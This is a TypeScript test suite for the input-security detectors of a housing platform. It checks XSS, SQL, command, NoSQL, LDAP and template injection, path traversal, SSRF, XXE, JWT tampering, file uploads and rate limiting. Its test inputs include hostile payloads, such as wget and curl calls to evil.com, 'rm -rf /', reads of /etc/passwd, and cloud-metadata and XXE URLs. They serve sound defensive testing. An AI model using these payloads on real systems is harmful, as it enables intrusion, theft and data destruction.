// ============================================================================
// COMPREHENSIVE SECURITY TEST SUITE — The Resident Platform
// Tests all 19 security modules in security.ts
// Run: npx tsx src/utils/security.test.ts
// ============================================================================

import test from 'node:test'
import assert from 'node:assert'
import {
  cleanScriptTags,
  encodeHTMLEntities,
  containsEventHandlerXSS,
  containsJavascriptURI,
  containsTagBasedXSS,
  containsXSS,
  containsSQLi,
  containsPathTraversal,
  containsCommandInjection,
  containsNoSQLi,
  containsHeaderInjection,
  containsOpenRedirect,
  containsPrototypePollution,
  containsSSRF,
  containsLDAPi,
  containsXXE,
  containsSSTI,
  generateCSRFToken,
  validateCSRFToken,
  validateJWTStructure,
  checkPasswordStrength,
  sanitizeInput,
  validateInputLength,
  validateUploadedFile,
  checkRateLimit,
  isValidContentType,
  scanInput,
} from './security'

// ===== 1. XSS Protection Tests =====
test('XSS — cleanScriptTags strips script blocks', () => {
  assert.strictEqual(cleanScriptTags('Hello <script>alert("hack")</script> World!'), 'Hello  World!')
  assert.strictEqual(cleanScriptTags('Normal text'), 'Normal text')
  assert.strictEqual(cleanScriptTags('<SCRIPT>evil()</SCRIPT>'), '')
  assert.strictEqual(cleanScriptTags('<script type="text/javascript">x</script>'), '')
})

test('XSS — encodeHTMLEntities', () => {
  assert.strictEqual(encodeHTMLEntities('<img src=x>'), '&lt;img src=x&gt;')
  assert.strictEqual(encodeHTMLEntities('"hello"'), '&quot;hello&quot;')
  assert.strictEqual(encodeHTMLEntities("it's"), "it&#x27;s")
})

test('XSS — containsEventHandlerXSS', () => {
  assert.strictEqual(containsEventHandlerXSS('onerror=alert(1)'), true)
  assert.strictEqual(containsEventHandlerXSS('onload=evil()'), true)
  assert.strictEqual(containsEventHandlerXSS('onmouseover=x'), true)
  assert.strictEqual(containsEventHandlerXSS('hello world'), false)
})

test('XSS — containsJavascriptURI', () => {
  assert.strictEqual(containsJavascriptURI('javascript:alert(1)'), true)
  assert.strictEqual(containsJavascriptURI('data:text/html,<script>x</script>'), true)
  assert.strictEqual(containsJavascriptURI('https://safe.com'), false)
})

test('XSS — containsTagBasedXSS', () => {
  assert.strictEqual(containsTagBasedXSS('<img src=x onerror=alert(1)>'), true)
  assert.strictEqual(containsTagBasedXSS('<iframe src=evil>'), true)
  assert.strictEqual(containsTagBasedXSS('<svg onload=evil>'), true)
  assert.strictEqual(containsTagBasedXSS('<embed src=x>'), true)
  assert.strictEqual(containsTagBasedXSS('<p>safe text</p>'), false)
})

test('XSS — master containsXSS', () => {
  assert.strictEqual(containsXSS('<script>alert(1)</script>'), true)
  assert.strictEqual(containsXSS('onerror=alert(1)'), true)
  assert.strictEqual(containsXSS('javascript:void(0)'), true)
  assert.strictEqual(containsXSS('<iframe src=evil>'), true)
  assert.strictEqual(containsXSS('Ivory Park Ext 2'), false)
})

// ===== 2. SQL Injection Tests =====
test('SQLi — containsSQLi detects all major vectors', () => {
  assert.strictEqual(containsSQLi("' UNION SELECT * FROM users --"), true)
  assert.strictEqual(containsSQLi("OR 1=1"), true)
  assert.strictEqual(containsSQLi("AND 1=1"), true)
  assert.strictEqual(containsSQLi("DROP TABLE listings"), true)
  assert.strictEqual(containsSQLi("DROP DATABASE prod"), true)
  assert.strictEqual(containsSQLi("SELECT * FROM rooms"), true)
  assert.strictEqual(containsSQLi("xp_cmdshell('dir')"), true)
  assert.strictEqual(containsSQLi("exec('cmd')"), true)
  assert.strictEqual(containsSQLi("'; DELETE FROM users --"), true)
  assert.strictEqual(containsSQLi("'; INSERT INTO users VALUES --"), true)
  assert.strictEqual(containsSQLi("information_schema.tables"), true)
  assert.strictEqual(containsSQLi("benchmark(10000000,SHA1('test'))"), true)
  assert.strictEqual(containsSQLi("SLEEP(5)"), true)
  assert.strictEqual(containsSQLi("WAITFOR DELAY '00:00:05'"), true)
  assert.strictEqual(containsSQLi("LOAD_FILE('/etc/passwd')"), true)
  assert.strictEqual(containsSQLi("INTO OUTFILE '/tmp/dump'"), true)
  assert.strictEqual(containsSQLi("GROUP_CONCAT(username)"), true)
  assert.strictEqual(containsSQLi("EXTRACTVALUE(1, 'x')"), true)
  // Safe inputs
  assert.strictEqual(containsSQLi("Ivory Park Ext 2"), false)
  assert.strictEqual(containsSQLi("London, Hackney"), false)
  assert.strictEqual(containsSQLi("3 bedroom apartment"), false)
})

// ===== 3. Path Traversal Tests =====
test('Path Traversal — containsPathTraversal', () => {
  assert.strictEqual(containsPathTraversal('../../../etc/passwd'), true)
  assert.strictEqual(containsPathTraversal('..\\..\\windows\\system32'), true)
  assert.strictEqual(containsPathTraversal('%2e%2e%2f%2e%2e%2f'), true)
  assert.strictEqual(containsPathTraversal('/etc/passwd'), true)
  assert.strictEqual(containsPathTraversal('/proc/self/environ'), true)
  assert.strictEqual(containsPathTraversal('c:\\windows\\system32'), true)
  assert.strictEqual(containsPathTraversal('file%00.txt'), true) // null byte
  assert.strictEqual(containsPathTraversal('profile_photo.jpg'), false)
})

// ===== 4. Command Injection Tests =====
test('Command Injection — containsCommandInjection', () => {
  assert.strictEqual(containsCommandInjection('; ls -la'), true)
  assert.strictEqual(containsCommandInjection('| cat /etc/passwd'), true)
  assert.strictEqual(containsCommandInjection('`whoami`'), true)
  assert.strictEqual(containsCommandInjection('$(id)'), true)
  assert.strictEqual(containsCommandInjection('&& rm -rf /'), true)
  assert.strictEqual(containsCommandInjection('; wget http://evil.com/shell.sh'), true)
  assert.strictEqual(containsCommandInjection('; curl http://evil.com'), true)
  assert.strictEqual(containsCommandInjection('; powershell -enc ZXZpbA=='), true)
  assert.strictEqual(containsCommandInjection('eval(evilCode)'), true)
  assert.strictEqual(containsCommandInjection('system("rm -rf /")'), true)
  assert.strictEqual(containsCommandInjection('Just a normal search'), false)
})

// ===== 5. NoSQL Injection Tests =====
test('NoSQL Injection — containsNoSQLi', () => {
  assert.strictEqual(containsNoSQLi('{"$gt": ""}'), true)
  assert.strictEqual(containsNoSQLi('$ne: null'), true)
  assert.strictEqual(containsNoSQLi('$where: "this.password"'), true)
  assert.strictEqual(containsNoSQLi('$regex: ".*"'), true)
  assert.strictEqual(containsNoSQLi('db.users.find()'), true)
  assert.strictEqual(containsNoSQLi('$or: [{x:1}]'), true)
  assert.strictEqual(containsNoSQLi('$elemMatch: {field: 1}'), true)
  assert.strictEqual(containsNoSQLi('Looking for a roommate'), false)
})

// ===== 6. Header Injection Tests =====
test('Header Injection — containsHeaderInjection', () => {
  assert.strictEqual(containsHeaderInjection('value\r\nSet-Cookie: evil=1'), true)
  assert.strictEqual(containsHeaderInjection('value%0d%0aSet-Cookie: evil=1'), true)
  assert.strictEqual(containsHeaderInjection('plain value'), false)
})

// ===== 7. Open Redirect Tests =====
test('Open Redirect — containsOpenRedirect', () => {
  assert.strictEqual(containsOpenRedirect('//evil.com/phish'), true)
  assert.strictEqual(containsOpenRedirect('https://evil.com/phish'), true)
  assert.strictEqual(containsOpenRedirect('/dashboard'), false) // Same-origin path
})

// ===== 8. Prototype Pollution Tests =====
test('Prototype Pollution — containsPrototypePollution', () => {
  assert.strictEqual(containsPrototypePollution('__proto__'), true)
  assert.strictEqual(containsPrototypePollution('constructor.prototype'), true)
  assert.strictEqual(containsPrototypePollution('Object.assign({}'), true)
  assert.strictEqual(containsPrototypePollution('["__proto__"]'), true)
  assert.strictEqual(containsPrototypePollution('normalField'), false)
})

// ===== 9. SSRF Tests =====
test('SSRF — containsSSRF', () => {
  assert.strictEqual(containsSSRF('http://127.0.0.1/admin'), true)
  assert.strictEqual(containsSSRF('http://169.254.169.254/latest/meta-data'), true)
  assert.strictEqual(containsSSRF('http://10.0.0.1/internal'), true)
  assert.strictEqual(containsSSRF('http://192.168.1.1/router'), true)
  assert.strictEqual(containsSSRF('[::1]'), true)
  assert.strictEqual(containsSSRF('metadata.google.internal'), true)
  assert.strictEqual(containsSSRF('file:///etc/passwd'), true)
  assert.strictEqual(containsSSRF('gopher://127.0.0.1'), true)
  assert.strictEqual(containsSSRF('https://api.safe-external.com'), false)
})

// ===== 10. LDAP Injection Tests =====
test('LDAP Injection — containsLDAPi', () => {
  assert.strictEqual(containsLDAPi(')(|(password=*)'), true)
  assert.strictEqual(containsLDAPi(')(&(uid=admin)'), true)
  assert.strictEqual(containsLDAPi('*)(cn=admin'), true)
  assert.strictEqual(containsLDAPi('normal search'), false)
})

// ===== 11. XXE Tests =====
test('XXE — containsXXE', () => {
  assert.strictEqual(containsXXE('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'), true)
  assert.strictEqual(containsXXE('<!ENTITY % dtd SYSTEM "http://evil.com/dtd">'), true)
  assert.strictEqual(containsXXE('xi:include href="file:///etc/passwd"'), true)
  assert.strictEqual(containsXXE('<user>normal data</user>'), false)
})

// ===== 11b. SSTI Tests =====
test('SSTI — containsSSTI', () => {
  assert.strictEqual(containsSSTI('{{7*7}}'), true)
  assert.strictEqual(containsSSTI('${7*7}'), true)
  assert.strictEqual(containsSSTI('#{7*7}'), true)
  assert.strictEqual(containsSSTI('{{this.constructor.prototype}}'), true)
  assert.strictEqual(containsSSTI('{{[].constructor.prototype}}'), true)
  assert.strictEqual(containsSSTI('${T(java.lang.Runtime)}'), true)
  assert.strictEqual(containsSSTI('<%= 7*7 %>'), true)
  assert.strictEqual(containsSSTI('normal text'), false)
})

// ===== 12. CSRF Token Tests =====
test('CSRF — generate and validate tokens', () => {
  const token = generateCSRFToken()
  assert.strictEqual(token.length, 64) // 32 bytes = 64 hex chars
  assert.strictEqual(validateCSRFToken(token), true)
  assert.strictEqual(validateCSRFToken('wrong-token'), false)
  assert.strictEqual(validateCSRFToken(''), false)
})

// ===== 13. JWT Validation Tests =====
test('JWT — validateJWTStructure', () => {
  // Invalid structure
  const noDotsResult = validateJWTStructure('invalidtoken')
  assert.strictEqual(noDotsResult.valid, false)

  // "alg: none" attack
  const algNone = [
    btoa(JSON.stringify({ alg: 'none' })),
    btoa(JSON.stringify({ sub: '1', role: 'user' })),
    ''
  ].join('.')
  const algNoneResult = validateJWTStructure(algNone)
  assert.strictEqual(algNoneResult.valid, false)
  assert.ok(algNoneResult.error?.includes('none'))

  // Privilege escalation attack
  const privEsc = [
    btoa(JSON.stringify({ alg: 'HS256' })),
    btoa(JSON.stringify({ sub: '1', role: 'admin' })),
    'fakesig'
  ].join('.')
  const privEscResult = validateJWTStructure(privEsc)
  assert.strictEqual(privEscResult.valid, false)
  assert.ok(privEscResult.error?.includes('privilege escalation'))

  // Expired token
  const expired = [
    btoa(JSON.stringify({ alg: 'HS256' })),
    btoa(JSON.stringify({ sub: '1', exp: 1000000 })),
    'sig'
  ].join('.')
  const expiredResult = validateJWTStructure(expired)
  assert.strictEqual(expiredResult.valid, false)
  assert.ok(expiredResult.error?.includes('expired'))

  // Valid token
  const validToken = [
    btoa(JSON.stringify({ alg: 'HS256' })),
    btoa(JSON.stringify({ sub: '1', role: 'tenant', exp: Math.floor(Date.now()/1000) + 3600 })),
    'valid-signature'
  ].join('.')
  const validResult = validateJWTStructure(validToken)
  assert.strictEqual(validResult.valid, true)
})

// ===== 14. Password Strength Tests =====
test('Password — checkPasswordStrength', () => {
  // Weak passwords
  assert.strictEqual(checkPasswordStrength('password').strong, false)
  assert.strictEqual(checkPasswordStrength('123456').strong, false)
  assert.strictEqual(checkPasswordStrength('abc').strong, false)

  // Strong password
  const strong = checkPasswordStrength('Tr0ub4dor&3xYz!')
  assert.strictEqual(strong.strong, true)
  assert.ok(strong.score >= 4)
})

// ===== 15. Input Sanitization Tests =====
test('sanitizeInput — strips and encodes', () => {
  const result = sanitizeInput('<script>alert(1)</script> Hello "World"')
  assert.ok(!result.includes('<script>'))
  assert.ok(result.includes('&quot;'))
})

test('validateInputLength', () => {
  assert.strictEqual(validateInputLength('short', 100), true)
  assert.strictEqual(validateInputLength('x'.repeat(501), 500), false)
})

// ===== 16. File Upload Tests =====
test('File Upload — validateUploadedFile comprehensive', () => {
  // Valid
  assert.strictEqual(validateUploadedFile('photo.jpg', ['jpg', 'png', 'pdf']).valid, true)

  // Invalid extension
  assert.strictEqual(validateUploadedFile('hack.exe', ['jpg', 'png', 'pdf']).valid, false)

  // Double extension
  assert.strictEqual(validateUploadedFile('exploit.php.png', ['jpg', 'png', 'pdf']).valid, false)

  // Path traversal in filename
  assert.strictEqual(validateUploadedFile('../../../etc/passwd', ['pdf']).valid, false)

  // Malware keyword
  assert.strictEqual(validateUploadedFile('backdoor.png', ['png']).valid, false)
  assert.strictEqual(validateUploadedFile('trojan.jpg', ['jpg']).valid, false)

  // Oversized filename
  assert.strictEqual(validateUploadedFile('a'.repeat(300) + '.jpg', ['jpg']).valid, false)

  // Empty filename
  assert.strictEqual(validateUploadedFile('', ['jpg']).valid, false)
})

// ===== 17. Rate Limiting Tests =====
test('Rate Limiting — checkRateLimit', () => {
  // Fresh key should be allowed
  const result1 = checkRateLimit('test-key-unique', 5, 60000)
  assert.strictEqual(result1.allowed, true)
  assert.strictEqual(result1.remaining, 4)

  // Exhaust the limit
  for (let i = 0; i < 4; i++) {
    checkRateLimit('test-key-unique', 5, 60000)
  }
  const blocked = checkRateLimit('test-key-unique', 5, 60000)
  assert.strictEqual(blocked.allowed, false)
  assert.strictEqual(blocked.remaining, 0)
})

// ===== 18. Content-Type Validation Tests =====
test('Content-Type — isValidContentType', () => {
  assert.strictEqual(isValidContentType('application/json', ['application/json', 'text/html']), true)
  assert.strictEqual(isValidContentType('application/json; charset=utf-8', ['application/json']), true)
  assert.strictEqual(isValidContentType('text/xml', ['application/json']), false)
})

// ===== 19. Master scanInput Tests =====
test('Master scanInput — detects multiple threat vectors', () => {
  const xssResult = scanInput('<script>alert(1)</script>')
  assert.strictEqual(xssResult.safe, false)
  assert.ok(xssResult.threats.includes('XSS'))

  const sqliResult = scanInput("' UNION SELECT * FROM users --")
  assert.strictEqual(sqliResult.safe, false)
  assert.ok(sqliResult.threats.includes('SQLi'))

  const pathResult = scanInput('../../../etc/passwd')
  assert.strictEqual(pathResult.safe, false)
  assert.ok(pathResult.threats.includes('PATH_TRAVERSAL'))

  const cmdResult = scanInput('; rm -rf /')
  assert.strictEqual(cmdResult.safe, false)
  assert.ok(cmdResult.threats.includes('COMMAND_INJECTION'))

  const safeResult = scanInput('Looking for 2-bedroom apartment in Ivory Park')
  assert.strictEqual(safeResult.safe, true)
  assert.strictEqual(safeResult.threats.length, 0)
})
